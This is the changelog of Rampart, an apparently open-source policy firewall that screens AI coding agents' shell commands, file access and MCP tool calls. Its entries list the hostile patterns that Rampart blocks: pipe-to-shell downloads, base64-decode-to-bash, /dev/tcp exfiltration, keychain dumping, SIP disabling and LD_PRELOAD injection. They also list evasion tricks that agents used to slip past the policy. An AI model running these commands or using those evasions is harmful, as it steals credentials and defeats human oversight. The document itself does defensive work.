# Changelog

All notable changes to Rampart are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.4.6] - 2026-02-21

### Fixed
- Stale port 18275 in `rampart hook --help` and `rampart setup` comment — both now correctly show port 9090 (matching `defaultServePort`)

### Added
- **`block-env-var-injection` policy** in `standard.yaml` — blocks interpreter hijacking via environment variable prefix injection (`LD_PRELOAD`, `NODE_OPTIONS`, `JAVA_TOOL_OPTIONS`, `PYTHONSTARTUP`, `RUBYOPT`, `PERL5OPT`, `DYLD_INSERT_LIBRARIES`). These patterns were previously bypassing glob rules because env-var prefixes are stripped before command matching.
- **PostToolUseFailure hook feedback** — when Rampart denies a `PreToolUse` event, the `PostToolUseFailure` handler now injects `additionalContext` telling Claude Code not to retry the blocked action. Prevents Claude from burning 3–5 turns on workarounds after a deny.

## [0.4.5] — 2026-02-21

### Added

- **`rampart setup codex`**: First-class setup subcommand for Codex CLI. Creates `~/.local/bin/codex` wrapper that transparently routes all Codex tool calls through `rampart preload` (LD_PRELOAD syscall interception). Supports `--remove` (verified — only removes Rampart-owned wrappers), `--force`, and PATH detection with a warning if `~/.local/bin` is not on PATH. The interactive setup wizard now auto-wires Codex when detected rather than showing a manual instruction.

### Fixed

- **`rampart upgrade` archive extraction**: goreleaser produces flat archives (`rampart`, `LICENSE`, `README.md`, `CHANGELOG.md` at archive root — no subdirectory prefix). The extraction function incorrectly required exactly one archive member, causing every upgrade attempt to fail with "unexpected archive layout". Removed the single-file guard; binary is found by name regardless of archive member count. Regression test added with the correct flat layout.
- **Deprecated `log` action in `standard.yaml`**: Two policies (`watch-env-access`, `log-mcp-dangerous`) used the legacy `action: log` (now `action: watch`). Updated to `action: watch` to match current schema.

## [0.4.4] — 2026-02-21

### Added

- **`command_contains` condition**: New policy condition for substring matching — matches when the full command string contains any of the listed substrings. Case-insensitive by default (`strings.ToLower` on both sides). Enables patterns that break glob matching: paths with spaces, mixed-case commands, patterns that must appear anywhere in the string. Example: `command_contains: ["do shell script"]` catches AppleScript shell bypasses regardless of quoting.
- **macOS hardening — 17 new policies** in `standard.yaml`:
  - `block-macos-keychain`: `security dump-keychain`, `find-generic/internet-password -w/-ga`, Keychain DB reads, 1Password/Bitwarden/browser cookies
  - `block-macos-security-bypass`: `spctl --master-disable`, `csrutil disable`, `csrutil authenticated-root disable`, `xattr -d com.apple.quarantine`
  - `block-macos-persistence`: `launchctl load/bootstrap`, `defaults write * autoLoginUser *`
  - `block-macos-user-management`: `dscl . -passwd/-create/-delete`
  - `block-macos-osascript-exec`: AppleScript `do shell script` via `command_contains`
  - Additional macOS paths added to `block-credential-access`
- **YAML billion-laughs protection**: `safeUnmarshal()` in `internal/engine/dirstore.go` applies a 1MB cap and `defer/recover` panic recovery to all YAML load paths. `os.Stat` size check before `os.ReadFile` in all loaders. Defense-in-depth — policy files come from trusted disk locations, but bomb inputs are now rejected at the YAML layer.
- **Policy upgrade on `rampart upgrade`**: After a binary upgrade, `upgradeStandardPolicies()` refreshes `standard.yaml`, `paranoid.yaml`, `yolo.yaml`, and `demo.yaml` from embedded profiles. `--no-policy-update` opts out. Custom files (`custom.yaml` and anything not in the built-in map) are never touched. Atomic write (temp + rename) with non-fatal failure.
- **`custom.yaml` template on first setup**: `rampart setup` creates `~/.rampart/policies/custom.yaml` with explanatory comments if it doesn't exist. Documents the naming convention, first-match-wins semantics, and an example rule. Non-fatal on write failure.
- **`block-network-exfil` policy**: Denies `/dev/tcp/` and `/dev/udp/` shell redirection patterns used for covert data exfiltration.
- **`watch-env-access` policy**: Logs `env` and `printenv` invocations for audit trail.
- **Encoding bypass patterns**: `base64 -d | bash`, `base64 --decode | sh`, `printf '\x` and `printf "\x` hex-encode-pipe patterns added to `block-destructive`.
- **SSE bulk-resolve**: Dashboard receives a single `audit_batch` event after bulk-resolve instead of N individual SSE events. Prevents flood that caused browser hangs on large team runs. History tab reloads on `audit_batch`.
- **Standard policy expansion**: Additional patterns across `block-credential-access`, `block-destructive`, and `block-network-exfil` to close coverage gaps on SSH keys, AWS credentials, and shell bypass techniques.

### Fixed

- **`command_contains` engine evaluation**: Condition was parsed but skipped in the real `matchCondition` path; evaluated only in `ExplainCondition`. Now correctly wired into `matchCondition`.
- **Security audit — uppercase bypass**: macOS keychain policies switched from `command_matches` to `command_contains` (case-insensitive). `SECURITY DUMP-KEYCHAIN` and similar all-caps prompts now caught.
- **Security audit — `-ga` flag variants**: `security find-generic-password -ga` and `find-internet-password -ga` added to keychain policy.
- **`demo.yaml` missing from upgrade built-in map**: `rampart upgrade` previously skipped refreshing `demo.yaml`. Fixed.
- **Auth review**: `subtle.ConstantTimeCompare` confirmed in token comparison; SSE endpoint returns 401 without valid token; token logged as prefix only.

## [0.4.3] — 2026-02-20

### Added

- **`rampart upgrade`**: Downloads and installs the latest release from GitHub. Detects architecture, extracts binary, replaces in-place, and reports the new version. `--yes` skips confirmation prompt.
- **`rampart serve --background`**: Starts the serve daemon in the background and exits immediately. PID written to `~/.rampart/rampart-proxy.pid`.
- **`rampart serve stop`**: Sends SIGTERM to the background serve process and waits for it to exit.
- **Silent reload on no-change**: Policy reload triggered by `inotify` now compares the loaded config hash; if policy is identical, the reload is skipped without logging.
- **Task tool → `agent` type**: Claude Code's `Task` tool (which spawns sub-agents) now maps to tool type `"agent"` in `mapClaudeCodeTool()`. Audit events and policy conditions correctly identify sub-agent spawns.

### Changed

- **`sudo` default action**: Changed from `action: watch` (log) to `action: require_approval` in `standard.yaml`. Privileged commands now block and require explicit dashboard approval by default.

### Fixed

- **Windows cross-compilation**: `Setsid` and `EACCES` references moved to platform-specific files. `goreleaser` builds all 6 release targets without errors.
- **Install order in docs**: `go install` promoted as recommended install method; Homebrew tap demoted to alternative.

## [0.4.2] — 2026-02-19

### Fixed

- **`**` glob patterns with >2 segments**: Removed erroneous bail-out in `matchDoubleGlob`. Patterns like `**/.ssh/**/.key/**` now correctly match arbitrary-depth paths. Recursion already handled arbitrary `**` count.
- **`ExplainCondition` / `matchCondition` contradiction**: Empty `when:` now consistently returns `true` (unconditional rule) in both runtime evaluation and explain output. `IsEmpty()` docstring corrected.
- **MCP proxy ignores `ActionWebhook` decisions**: Added `case engine.ActionWebhook:` branch. Webhook is now consulted before forwarding to the child MCP server.
- **`/metrics` endpoint unauthenticated**: Prometheus handler now gated behind `checkAuth`. Unauthenticated requests receive 401.
- **`sink.Write()` return value discarded**: Write errors in the daemon's approval handler are now logged instead of silently dropped.
- **No line-length cap on JSON-RPC reads**: Both client→proxy and proxy→server read paths now use `bufio.NewReaderSize` (4MB) with an explicit size check. A gigabyte-long line from a malicious MCP server previously caused OOM.
- **`rampart doctor` port mismatch**: Doctor now uses the shared `defaultServePort` constant instead of a stale hardcoded `18275`. False negatives on directly-run serve are fixed.
- **`DirStore` silently drops invalid policy files**: `rampart doctor` now runs `LintPolicyFile` on each loaded policy and surfaces rule typos and condition field errors as failures with a hint to run `rampart policy lint`.
- **Unicode-correct glob matching**: Glob comparison now operates on Unicode code points rather than bytes. Non-ASCII characters in command strings or glob patterns match correctly.

## [0.4.1] — 2026-02-19

### Security

- **CEF log injection**: `esc()` and `escH()` in `internal/audit/cef.go` now escape `\n`/`\r` in addition to `\` and `=`/`|`. An agent could previously inject newlines into command or path parameters to forge additional CEF fields in the audit log. JSONL output was unaffected.
- **Service file token exposure**: Launchd plist and systemd unit files written with mode `0o600` (was `0o644`). Both files contain `RAMPART_TOKEN` inline. `os.Chmod` applied after `os.WriteFile` to fix permissions on existing files upgraded in-place.
- **Template injection in service files**: Switched plist generation from `text/template` to `html/template`. Token sanitized (newlines/CR/tabs stripped) before embedding in `serviceConfig`. `plistXMLEscape()` helper added for the `fmt.Sprintf` path in `setup.go`.
- **Parse failures fail closed**: Hook now returns `hookDeny` (not `hookAllow`) on stdin parse failure when `mode=enforce`. A bug or malformed hook payload must not silently allow a tool call. Monitor/audit modes remain fail-open.
- **Ctrl-C → `hookDeny`**: Context cancellation during approval creation now fails closed instead of falling back to Claude Code's native permission prompt.
- **200 denied → `hookDeny`**: Bulk-deny response (HTTP 200 with `status: "denied"`) now correctly maps to deny. Previously incorrectly returned `hookAsk`.

### Fixed

- **Goroutine leak on shutdown**: `Server.Shutdown()` now calls `s.approvals.Close()`, stopping the background cleanup goroutine and unblocking `watchExpiry` goroutines. Previously they leaked for up to 1 hour (the default approval timeout) after every graceful shutdown.
- **Data races**: `Get()` and `List()` return snapshot copies (value, not pointer) eliminating races with concurrent `watchExpiry` writes. Race detector clean.
- **Empty approval ID guard**: Hook now returns `hookAsk` immediately if serve returns 201 with an empty ID, instead of polling `/v1/approvals/` for the full timeout.
- **Poll loop HTTP status codes**: 404/410 → immediate `hookDeny`; 5xx → log and retry. Previously all non-network errors spun silently until timeout.
- **`bulk-resolve` action validation**: Empty or unrecognized action values previously defaulted to approve, silently bulk-approving entire runs on typos or empty request bodies. Now returns 400.
- **`AutoApproveRun` TOCTOU**: Auto-approve cache is now set before the resolve loop. Approvals created between `List()` and end of loop are caught by the cache rather than remaining pending.

## [0.4.0] — 2026-02-19

### Added

- **Agent team run grouping**: Every tool call is now tagged with a `run_id` derived from Claude Code's `session_id` (shared across all agents in the same session). Cline users get `taskId` as the run ID. Override with `RAMPART_RUN` env var; `CLAUDE_CONVERSATION_ID` used as fallback. Zero configuration required — existing policies and users see no change.
- **`POST /v1/approvals/bulk-resolve`**: Resolve all pending approvals for an agent team run in one API call. Body: `{"run_id": "...", "action": "approve|deny", "resolved_by": "..."}`. Returns `{"resolved": N, "ids": [...]}`. Empty or missing `run_id` is hard-rejected with 400 to prevent accidental mass-approval.
- **Auto-approve cache**: After bulk-approving a run, subsequent tool calls from that run bypass the approval queue automatically for the duration of the approval timeout (default 1h). Cache is TTL-based and cleaned up in the regular `Cleanup()` cycle — no goroutine leaks.
- **Dashboard run clusters**: When 2+ pending approvals share a `run_id`, the Active tab groups them into a collapsible cluster card showing `Run: {id[:8]}… (N pending)`. Clusters have **Approve All** and **Deny All** buttons with confirmation dialogs. Solo items (no `run_id`, or unique `run_id`) render exactly as before.
- **`GET /v1/approvals` run_groups field**: The approvals list response now includes a `run_groups` array alongside the flat `approvals` array. Each entry has `run_id`, `count`, `earliest_created_at`, and `items`. Only groups with 2+ pending items are included; groups are sorted by `MIN(created_at)` (chronological, not UUID order). Fully backwards compatible — existing consumers ignore the new field.
- **Full PreToolUse hook schema**: `hookInput` now captures all fields Claude Code sends: `session_id`, `transcript_path`, `cwd`, `permission_mode`, `hook_event_name`, `tool_use_id`. Previously only `tool_name` and `tool_input` were parsed.
- **`run_id` in audit events**: Audit log entries include `"run_id"` (omitempty) so team runs are traceable across the full audit trail.

### Fixed

- **CI docs deploy**: The Deploy Docs workflow was pushing compiled output to `peg/rampart`'s own `gh-pages` branch instead of `peg/rampart-docs`, which is the repo actually serving `docs.rampart.sh`. Fixed to clone and push to `peg/rampart-docs`. Requires `DOCS_DEPLOY_TOKEN` secret (PAT with `contents:write` on `peg/rampart-docs`).

## [0.3.1] — 2026-02-18

### Fixed

- **Mobile hero font size**: `.hero-title` heading was 2.5rem on narrow screens (≤600px), causing word-wrap on small phones. Reduced to 1.75rem via media query.
- **`file_path` parameter support**: Claude Code sends `file_path` (not `path`) in `Read`, `Write`, and `Edit` tool input. `Path()` method and dashboard `extractCmd` function now check `file_path` first, then fall back to `path`. Previously the file path was silently dropped from audit events and approval cards for all file operations.

### Changed

- **Docs subtitle**: Updated from "Open-source firewall for AI agents" to "Open-source guardrails for AI agents. A policy firewall for shell commands, file access, and MCP tools."

## [0.3.0] — 2026-02-18

### Added

- **`rampart quickstart`**: One-shot setup command — detects your AI coding environment (Claude Code, Codex, etc.), installs the service, wires up hooks, and runs `rampart doctor`. Get protected in a single command.
- **`rampart init --project`**: Scaffolds `.rampart/policy.yaml` in the current git repo with a commented template for team-shared project rules. Errors clearly if the file already exists (no silent overwrites). Commit the generated file to share guardrails with your team.
- **Project-local policy files**: Drop `.rampart/policy.yaml` in any git repo and Rampart automatically loads and layers those rules on top of your global policy — no configuration required. Rules are additive. Set `RAMPART_NO_PROJECT_POLICY=1` to disable. (`LayeredStore`)
- **Session identity**: Every hook audit event now carries a `session` field auto-derived from `git rev-parse` (format: `repo/branch`, e.g. `rampart/staging`). Zero configuration — falls back to `""` outside git repos. Override with the `RAMPART_SESSION` env var for orchestrators and CI.
- **Policy session conditions**: New `session_matches` / `session_not_matches` condition fields in `when:` blocks. Use `session:` at the `match:` level to scope an entire policy to specific sessions (glob patterns, same semantics as `agent:`).
- **Policy REPL**: The dashboard Policy tab now has a "Try a Command" tester — type any `exec`, `write`, or `read` command and instantly see what your loaded policy would do (allow / deny / require_approval / watch), including which rule matched. Backed by the new `POST /v1/test` endpoint.
- **Dashboard: session in approval cards**: Active approval cards show the session (repo/branch) the request came from. The Active tab groups pending approvals by session for easier triage.
- **Dashboard: write/read path display**: The denials feed and approval cards now correctly display the file path for `write` and `read` tool calls (previously only `exec` commands were shown).
- **Dashboard History: Session column**: Session field added between Agent and Tool in the History tab; included in search; detail panel shows Session field.
- **`rampart doctor` overhaul**:
  - Colored terminal output: `✓` green, `✗` red, `⚠` yellow. Colors suppressed when `--json` is set or `NO_COLOR` is present.
  - `--json` flag: Structured output `{checks, issues, warnings}` for CI integration.
  - Project policy check: Shows whether a `.rampart/policy.yaml` is active in the current repo (informational, never a failure).
  - 6 new health checks: PATH (rampart binary in PATH), Token (persisted or env), Hook binary path (verifies absolute paths in `settings.json` exist), Token auth (validates token against `/v1/policy`), Policies via API (checks `policy_count > 0`), Pending approvals (warns if any pending).
  - Fixed port from 19090/9090 to the canonical **18275**.
  - Exits 1 when issues > 0 (previously always exited 0).
- **`rampart test --json`**: `--json` flag on `rampart test` (and bare `rampart <file>`) emits `{passed, failed, errors, total, tests:[...]}` to stdout for CI integration.
- **`rampart test` zero-arg**: When called with no arguments, auto-discovers `rampart-tests.yaml` then `rampart.yaml` in the current directory.
- **`rampart policy test`**: Alias for `rampart test` available under the `policy` subcommand.
- **`/healthz` version field**: The health endpoint now includes `"version"` in the JSON response.
- **Audit API session filter**: `GET /v1/audit/events?session=<value>` filters events by session. `GET /v1/audit/stats` now includes a `by_session` breakdown.

### Changed

- **Default approval timeout**: Increased from **5 minutes to 1 hour**. Override with `--approval-timeout` (e.g. `--approval-timeout=30m`).

### Fixed

- **`sudo **` glob**: `sudo *` in standard.yaml did not match commands containing path arguments (e.g. `sudo rm -rf /`) because `*` does not cross `/` in glob matching. Changed to `sudo **` throughout.
- **`**` glob patterns in standard.yaml**: Pipe-to-shell patterns (`curl * | bash`, `wget * | sh`, etc.) and other path-based rules now use `**` consistently so URLs and file paths with `/` are correctly matched.
- **Policy REPL JSON parse**: The dashboard REPL was calling `api(...)` and treating the result as parsed JSON. `api()` returns a `Response` object — fixed to `await api(...).then(r => r.json())`.
- **`extractCmd` write/read path**: Dashboard denials feed was only extracting the command field from `exec` tool calls. Fixed to also extract the `path` field from `write` and `read` tool calls.
- **`doctorPending` key**: Doctor's pending approval check was reading the wrong key from the `/v1/approvals` response, always showing 0 pending regardless of actual state.
- **`responseRegexCache` deep copy**: Response-side regex cache was aliased across evaluations, causing cross-request cache pollution. Now deep-copied per evaluation.
- **`RAMPART_SESSION` env priority**: Environment variable now correctly takes priority over the git-derived session value when both are present.
- **Duplicate policy log in `mergeYAMLFiles`**: Downgraded from WARN to DEBUG. Same-directory YAML files with overlapping policy names no longer spam the log.

## [0.2.36] — 2026-02-18

### Fixed
- Default policy pipe-to-shell patterns (`curl * | bash`, `wget * | sh`, etc.) now use `**` instead of `*` so they correctly match URLs containing `/`. Previously `curl https://example.com/payload | bash` was silently allowed because `*` does not cross `/` boundaries in glob matching.

## [0.2.35] — 2026-02-18

### Fixed
- `rampart hook` now auto-reads the token from `~/.rampart/token` when `RAMPART_TOKEN` is not set in the environment. Claude Code hooks don't inherit the user's shell environment, so the token was never available at hook runtime — events silently fell back to local-only evaluation and never reached the dashboard. The hook now discovers both the serve URL (`localhost:18275`) and the token from standard locations, with no credentials needed in `settings.json`.
- `rampart serve install` now persists the generated token to `~/.rampart/token` (mode 0600). This is the canonical token location the hook reads from automatically.
- Dashboard now shows hook events. The hook and serve both write to `~/.rampart/audit/` but used different filename prefixes (`audit-hook-YYYY-MM-DD.jsonl` vs `YYYY-MM-DD.jsonl`). The audit API now reads both, so all events appear in the History tab regardless of which component wrote them.

## [0.2.34] — 2026-02-18

### Fixed
- `rampart setup claude-code` now writes the absolute binary path in the hook command (e.g. `/usr/local/bin/rampart hook`) instead of bare `rampart hook`. Claude Code hooks do not inherit the user's shell `PATH`, so the bare name silently failed at runtime.
- Hook removal (`rampart setup claude-code --remove`) now correctly identifies absolute-path hook entries written by the above fix.
- `rampart serve --addr` now validates the value is a valid IP address and returns a clear error on bad input.
- Success output for `rampart setup claude-code` now shows the resolved hook command path so users can verify the correct binary is registered.

### Tests
- Added `TestMemoryStore_Load` and `TestMixedStore_Load` covering embedded policy loading, directory merging, duplicate skipping, and error propagation.

## [0.2.33] — 2026-02-18

### Added
- `rampart serve --addr` flag to bind to a specific interface (e.g. `127.0.0.1` to avoid conflicts with Tailscale/VPN listeners)
- Default embedded policy: `rampart serve` now works out of the box with no `--config` file required
- `/v1/policy` API endpoint for runtime policy introspection (mode, counts, config path)
- Dashboard: 3-tab layout (Active / History / Policy), flex card layout for pending approvals, action:watch badge style

### Changed
- **`action: watch`** replaces `action: log` as the canonical name for the observe-but-allow action. `log` still works but emits a lint deprecation warning. All CLI output, TUI, and webhook formatters updated to use `watch`.
- **Default policy change:** `sudo *` commands now trigger `require_approval` instead of `log`. If you rely on sudo passing through silently, set `action: watch` or `action: allow` explicitly.
- `log-network-exfil` policy removed from standard.yaml — plain `curl`/`wget` are now allowed by default. Only piped execution (`curl ... | bash`) is blocked.
- `rampart serve install` (macOS launchd): added `WorkingDirectory` to plist to prevent CWD issues

### Fixed
- `action: watch` now correctly parsed in all contexts (`ParseAction`, `parseDefaultAction`, policy lint)
- Action rename fully propagated to all consumers (audit CLI stats, status, watch TUI, wrap, Slack/Discord/Teams webhooks)
- Shell profile echo commands shown after `serve install` on macOS and Linux

## [0.2.3] — 2026-02-18

### Added
- **Unified approval system** — `rampart hook` now delegates `require_approval` to a running `rampart serve` instance via `--serve-url`. Approvals can be resolved from the dashboard, `rampart watch`, API, or native Claude Code prompt (fallback).
- **Dashboard v2** — Complete redesign with compact table layout, 4 tabs (Pending, History, Audit Log, Rules), dark/light theme toggle, bulk approve/deny, resizable columns, dangerous command detection.
- **Persist-to-policy** — "Always Allow" creates auto-generated rules in `~/.rampart/policies/auto-allowed.yaml` with clean YAML output and deduplication.
- **Rules management** — View and revoke auto-allowed rules from the dashboard or API (`GET/DELETE /v1/rules/auto-allowed`).
- **Audit API** — `GET /v1/audit/events` (query with filters), `/dates`, `/stats`, `/export` (JSONL download).
- **Directory-based policy loading** — Engine loads all `*.yaml` from a policies directory with `--config-dir`. Auto-includes `~/.rampart/policies/`.
- **Hot reload** — Policies re-read every 30 seconds (configurable via `--reload-interval`), so auto-allowed rules take effect without restart.
- **Configurable approval timeout** — `--approval-timeout` flag on `rampart serve` (default: 5 minutes).
- **Interactive `rampart watch`** — Keybindings: `a` approve, `d` deny, `A` always-allow, `1-9` select, `q` quit.
- **Approval deduplication** — Same tool+command+agent within 60 seconds returns existing approval ID.
- **Hash-chained audit events** for all approval resolutions (approved/denied/always-allowed).
- **Explicit `permissionDecision: "allow"`** for PreToolUse hooks (contributed by @aegixx, PR #51).

### Changed
- **⚠️ Breaking: Empty `when:` clause now matches all tool calls.** Previously, rules with no `when:` conditions silently matched nothing. Now they act as catch-all rules within their policy scope. **If you have rules with empty `when:` clauses, they will now activate.** Review your policies before upgrading.
- Dashboard redesigned from card layout to compact table rows.
- `--serve-token` flag deprecated — prefer `RAMPART_TOKEN` environment variable (flag visible in `ps aux`).
- Lint message for empty `when:` downgraded from warning to info (correct behavior now).

### Fixed
- Approval ordering now deterministic (sorted by creation time).
- Dangerous commands (`rm`, `kill`, `chmod`, `dd`, etc.) never generalized in persist-to-policy.
- Single-token commands kept exact in generalization (`ls` stays `ls`, not `ls *`).
- Atomic policy file writes prevent corruption on concurrent "Always Allow".
- Hook polling respects context cancellation for clean Ctrl-C.
- Dashboard timer updates no longer cause layout shift.
- Double `Stop()` on engine no longer panics.
- Audit dates endpoint no longer leaks server filesystem path.

### Security
- All new API endpoints require Bearer token authentication.
- "Always Allow" button requires confirmation dialog.
- Auto-generated YAML uses `yaml.Marshal` (prevents YAML injection).
- HMAC-signed approval resolve URLs for webhook notifications.

## [0.2.26] — 2026-02-16

### Added
- **Shell subcommand extraction** — `ExtractSubcommands()` detects commands inside `$(...)`, backticks, and `eval` wrappers. Matcher evaluates extracted subcommands against `command_matches` patterns, closing a documented evasion vector. 16 tests + fuzz test
- **Tutorial docs** — "Protect your first agent in 5 minutes" walkthrough and troubleshooting guide with 6 common issues
- **Example policy templates** — `policies/examples/` with web-developer, infrastructure, data-science, and lockdown templates (all with inline tests)
- **CLI test coverage** — 49.3% → 58.3% (3 new test files)

## [0.2.25] — 2026-02-16

### Added
- **Response-side scanning** — PostToolUse hooks evaluate tool output through `EvaluateResponse()`. Default credential leak patterns in `standard.yaml` (AWS keys, GitHub PATs, private keys, OpenAI keys, Slack tokens)
- **Policy linter** — `rampart policy lint` catches common YAML mistakes: unknown fields with typo suggestions, match/when confusion, reason/message confusion, shadowed rules, excessive glob depth. 10 checks (3 error, 5 warning, 2 info)
- **CLI test coverage** — 15 new test files, coverage 37.7% → 49.7%

### Fixed
- **PostToolUse field name** — corrected `tool_result` → `tool_response` per Claude Code docs
- **PostToolUse output format** — uses top-level `decision`/`reason` instead of `hookSpecificOutput`

## [0.2.24] — 2026-02-15

### Added
- **Shell-aware command parsing** — `NormalizeCommand()` strips quotes, backslash escapes, env var prefixes to prevent policy evasion (`'rm' -rf /`, `r\m`, `"rm" -rf /` all now match)
- **`SplitCompoundCommand()`** — handles `&&`, `||`, `;`, pipes — each segment matched independently
- **Policy test framework** — `rampart test policy.yaml` runs inline test suites with colored output, `--verbose` and `--run` filtering
- **Prometheus metrics** — opt-in via `rampart serve --metrics`. 5 metrics: `rampart_decisions_total`, `rampart_eval_duration_seconds`, `rampart_pending_approvals`, `rampart_policy_count`, `rampart_uptime_seconds`
- **Goreleaser Homebrew** — `brews:` section for auto-updating `peg/homebrew-rampart` on release
- **30-second quickstart** — copy-paste install + setup + inline output preview at top of README
- **Collapsible TOC** — README table of contents grouped by category

## [0.2.23] — 2026-02-15

### Security
- **Removed `git` and `sed` from safe binaries** — prevents policy bypass via `git -c core.sshCommand` and `sed -e '1e'`
- **Webhook `FailOpen` default → false** — webhook outages now block instead of silently allowing
- **Go 1.24.13** — resolves 13 reachable stdlib vulnerabilities
- **Audit file permissions 0644 → 0600** — prevents other users from reading audit logs
- **HTTP webhook URL warning** — logs `slog.Warn` for non-HTTPS webhook URLs
- **Daemon API auth fix** — Bearer token now works when HMAC signer is also configured
- **Token removed from dashboard URL** — `rampart serve` prints hint instead of full token
- **Referrer-Policy → no-referrer** — prevents token leakage via referrer headers
- **Approval store capped at 1000** — prevents memory exhaustion from unbounded approvals
- **Reload rejects zero-policy configs** — prevents accidental "allow everything" on bad reload
- **Glob `**` segment limit (max 3)** — prevents quadratic matching complexity
- **`stripLeadingComments` returns empty for all-comment input** — prevents bypass via comment-only payloads

### Added
- **govulncheck in CI** — informational vulnerability scanning on every push
- **SHA-pinned GitHub Actions** — all 3 workflow files use commit hashes
- **CODEOWNERS** — `* @peg`
- **Glob matching limitations documented** — in policy engine and threat model docs

## [0.2.22] — 2026-02-15

### Changed
- **README architecture diagram redesigned** — LR flow, agents grouped, audit as required step
- **`tamper-evident` language** — corrected from `tamper-proof` throughout docs and code
- **Setup command table** — added to README with `--patch-tools` note for OpenClaw

## [0.2.21] — 2026-02-15

### Added
- **GET approval endpoint** — `GET /v1/approvals/:id` for polling approval status
- **OpenClaw shim** — auto-detection and chat-based approval integration

## [0.2.2] — 2026-02-15

### Added
- **Dashboard on `rampart serve`** — embedded approval dashboard now at `/dashboard/` (was daemon-only)
- **Community policy library** — 5 ready-to-use templates: Kubernetes, AWS CLI, Terraform, Docker, Node.js/Python
- **Fuzz tests** — 6 fuzz test suites covering policy parser, condition matcher, engine evaluator, hook parsers, proxy request parser, and command sanitizer
- **Approval dashboard documentation** — full guide with security model, API reference, and hook integration
- **Upgrade and uninstall guides** — covers all install methods, hook removal, and data cleanup

## [0.2.0] - 2026-02-15

### Added
- **`require_approval` action** — block tool calls until a human approves or denies them
- **Claude Code `ask` hook** — `require_approval` maps to Claude Code's native permission prompt (`permissionDecision: "ask"`)
- **MCP proxy blocking** — `require_approval` tools stay visible in `tools/list` but block on `tools/call` until resolved
- **Signed resolve URLs** — HMAC-SHA256 self-authenticating links for webhook recipients (no token needed)
- **Auto-generated signing key** — `~/.rampart/signing.key` created on first run (0600 permissions)
- **`--signing-key` flag** — custom signing key path for `serve` and `daemon` commands
- **`--resolve-base-url` flag** — configurable base URL for approval resolve links
- **Web dashboard security** — X-Frame-Options DENY, Content-Security-Policy, nosniff, no-store headers
- **Dashboard history section** — view resolved approvals with resolution details
- **OpenClaw notifier** — dedicated webhook format for OpenClaw approval integration
- **OpenClaw approval guide** — `docs/guides/openclaw-approval.md`
- **GoReleaser config** — reproducible cross-platform release builds with checksums
- **GitHub Actions release workflow** — automatic releases on tag push
- **CHANGELOG.md** — this file

### Changed
- **BREAKING: Webhook JSON tags are now snake_case** — `"Action"` → `"action"`, `"Tool"` → `"tool"`, etc. Update any webhook consumers that parse field names.
- **Default `notify.on` includes `require_approval`** — approval notifications fire by default without explicit config
- **Go version bumped to 1.24.13** — fixes 13 known vulnerabilities in standard library (crypto/tls, net/url, net/http, crypto/x509, encoding/asn1, encoding/pem, os/exec)
- **Makefile LDFLAGS fixed** — version info now correctly injected into binaries (was using wrong module path)
- **Regex patterns pre-compiled** — `sanitizeCommand()` no longer recompiles 15 regexes per call

### Fixed
- **MCP proxy zombie approvals** — pending approvals now cleaned up on context cancellation and proxy shutdown
- **MCP proxy silent drops** — JSON-RPC error now sent to client on cancel/shutdown (was silent)
- **Dashboard CSP headers** — keywords properly quoted (`'self'`, `'unsafe-inline'`)
- **Dashboard XSS** — approval IDs escaped in `data-id` attributes
- **Dashboard polling** — exponential backoff (2s → 30s) with AbortController to prevent request overlap
- **OpenClaw platform auto-detection** — tightened from substring match to domain-only (openclaw.dev/ai/io)
- **Resolve URL generation** — eliminated mutex-based addr lookup race; uses captured listener address

## [0.1.14] - 2026-02-11

### Added
- Daily audit file rotation (`YYYY-MM-DD.jsonl`)
- Size rotation within day (`.p1.jsonl`, `.p2.jsonl`)

## [0.1.13] - 2026-02-11

### Added
- Heredoc body stripping (`StripHeredocBodies`) to prevent false positives
- Quoted argument stripping for safe binaries (echo, git, cat)
- `command_effective` field in ToolCall params

### Fixed
- Policy gaps: `/etc/shadow`, `/etc/passwd`, `/etc/sudoers` in standard policy
- Doctor only shows hook checks for installed agents
- Shim template uses `/v1/tool/exec` (was `/v1/preflight/exec`)

## [0.1.12] - 2026-02-10

### Added
- `--patch-tools` flag for native OpenClaw file tool patching
- Interactive setup wizard improvements
- `--remove` flag restores tool backups

## [0.1.11] - 2026-02-10

### Added
- Interactive setup wizard (`rampart setup`)
- `rampart doctor` with version check
- `rampart status`, `rampart test`, `rampart log` commands
- `--remove` flag for all agent integrations
- Colored deny messages in terminal
- Enhanced `rampart watch` TUI

## [0.1.8] - 2026-02-09

### Added
- Leading comment stripping for agent frameworks
- Security hardening: path traversal bypass fix, 1MB response body cap, HTTP timeouts
- MCP proxy test coverage (30 tests, was 0%)

### Fixed
- Hot-reload race: fsnotify truncated-file rejection with 100ms delay
- Glob matching: `*` now crosses `/` for leading wildcard patterns

## [0.1.7] - 2026-02-09

### Added
- `--syslog` flag (RFC 5424 syslog output)
- `--cef` flag (Common Event Format for SIEM integration)
- Wazuh integration guide with custom decoder and rules
- `action: webhook` for delegating decisions to external HTTP endpoints

## [0.1.6] - 2026-02-08

### Added
- `rampart mcp scan` — auto-generate policy YAML from MCP server tool lists

## [0.1.5] - 2026-02-08

### Added
- **LD_PRELOAD interception** — `preload/librampart.c` (472 lines C)
- `rampart preload -- codex` for Codex CLI support
- Intercepts execve/execvp/system/popen/posix_spawn

## [0.1.3] - 2026-02-07

### Fixed
- Hot-reload bug: empty config during mid-write → deny-all. Fix: 100ms delay + reject empty configs
- Glob matching: `filepath.Match` `*` doesn't cross `/`. Added `matchWildcardSegments`

## [0.1.2] - 2026-02-07

### Added
- Initial public release
- Policy engine with glob matching
- Claude Code hooks integration
- MCP proxy with tools/list filtering
- HTTP proxy with Bearer auth
- Shell shim (`rampart wrap`)
- Webhook notifications (Slack, Discord, Teams, generic)
- Audit logging (JSONL)
- `rampart watch` TUI
- Standard policy (`policies/standard.yaml`)

[Unreleased]: https://github.com/peg/rampart/compare/v0.3.0...HEAD
[0.3.0]: https://github.com/peg/rampart/compare/v0.2.36...v0.3.0
[0.2.36]: https://github.com/peg/rampart/compare/v0.2.35...v0.2.36
[0.2.35]: https://github.com/peg/rampart/compare/v0.2.34...v0.2.35
[0.2.34]: https://github.com/peg/rampart/compare/v0.2.33...v0.2.34
[0.2.33]: https://github.com/peg/rampart/compare/v0.2.3...v0.2.33
[0.2.3]: https://github.com/peg/rampart/compare/v0.2.26...v0.2.3
[0.2.26]: https://github.com/peg/rampart/compare/v0.2.25...v0.2.26
